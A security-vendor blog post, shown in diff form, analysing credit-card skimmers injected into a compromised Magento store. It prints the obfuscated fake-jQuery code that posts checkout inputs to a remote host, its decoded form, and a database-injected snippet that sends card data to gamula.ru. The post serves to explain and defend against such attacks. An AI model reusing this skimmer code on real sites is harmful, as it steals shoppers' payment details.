@@ -1,0 +1,46 @@
+Ecommerce Security: Fake Jquery Used as CC Scraper
+
+In the last few months, we noticed an increase in attacks targeting ecommerce platforms aiming to steal credit card information. We saw a similar rise last year after the summer ended, and believe that trend will continue now that the holiday season is quickly approaching.
+Most of these attacks are based on intercepting the communication between the online store and the payment gateway (the checkout process) in order to send valuable information to the attacker. Even if ecommerce site leverages a trusted payment gateway, attackers can redirect customers to a malicious payment process if the site itself is compromised.
+In this article, we’ll post another interesting CC stealer variant against a Magento installation.
+Injections in JavaScript Files and DB
+After compromising the website, attackers injected the following code into the file: /js/varien/js.js
+jQuery(function(t){t("button").on("click",function(){q="h="+window.location.href,q.match
+(/onepage|checkout/gi)&&(t("input, select").each(function(){t(this).val()?q+="&"+t(this)
+.attr("name")+"="+t(this).val():""}),t.post(t("<div />").html("&#104;&#116;&#116;&#112;&
+#115;&#58;&#47;&#47;&#99;&#108;&#111;&#117;&#100;&#102;&#117;&#115;&#105;&#111;&#110;&#46;
+&#109;&#101;&#47;&#99;&#100;&#110;&#47;&#106;&#113;&#117;&#101;&#114;&#121;&#46;&#109;&#105;
+&#110;&#46;&#106;&#115;").text(),q))})});</script><script src="hxxp://website[.]com/js/varien/js.js"></script>
+
+<script src="hxxp://website[.]com/js/varien/form.js"></script>
+After decoding the HTML characters, we get the following function pretending to be part of jQuery:
+jQuery(function(t) {
+t("button").on("click", function() {
+q = "h=" + window.location.href, q.match(/onepage|checkout/gi) && (t("input, select").each(function()
+{ t(this).val() ? q += "&" + t(this).attr("name") + "=" + t(this).val() : "" }
+), t.post(t("<div />").html("hxxps://cloudfusion[.]me/cdn/jquery.min.js" ).text(), q))
+})
+});
+This malicious code checks if the URL matches onepage or checkout (payment process page). If it does, the input values are sent via a $_POST request to the remote address hxxps://cloudfusion[.]me/cdn/jquery.min.js
+Along with the file injection, attackers also added it to the core_config_data (design/head/includes) section of the database. These snippets guarantee a constant check for those URLs, ensuring the sensitive input is relayed to the attacker.
+Magento DB Credit Card Stealer
+During our investigation, we also came across a different type of Magento infection on the same online store. This malware adds an extra layer to the attack that continuously harvests credit card numbers and stores them in a remote location (gamula.ru). This is another one of the servers used to collect data without the customer or website owner knowing.
+The following code was identified in the database, and it redirects the customer to a fake checkout page. After they enter their credit card number, credit card type, and the card verification number, all of the form data is harvested and sent back to the attacker.
+...
+}
+var http = new XMLHttpRequest();
+http.open("POST","https://gamula.ru/order.php",true);
+http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+http.send("data="+snd+"&asd="+asd+"&id_id=website.com");
+console.clear();
+}
+snd=null;
+setTimeout('send()', 150);
+}
+...
+
+At this point the hackers successfully created an attack which modifies the legitimate site’s checkout page, leading the users to enter their payment data and information on a fake checkout page instead.
+If the user is unaware that they have been redirected to https://gamula.ru/order.php – all the data they input is sent to the attacker where it can be used for malicious purposes. The Magento shop owner in this case never sees the sale and may have to consider the impacts on their PCI compliance.
+Conclusion
+This is one of the many injection techniques attackers have been using against Magento ecommerce sites in order to steal credit card data. This incident demonstrates that there is no way to prevent data theft if your site is hacked.
+There is more to ecommerce security than secure payment gateways. In order to reduce the risk of this happening to your online shop, we recommend keeping all software updated (themes, modules, core files), using a Website Application Firewall, and having a file integrity monitoring system to alert you of any unauthorized modifications to your website.
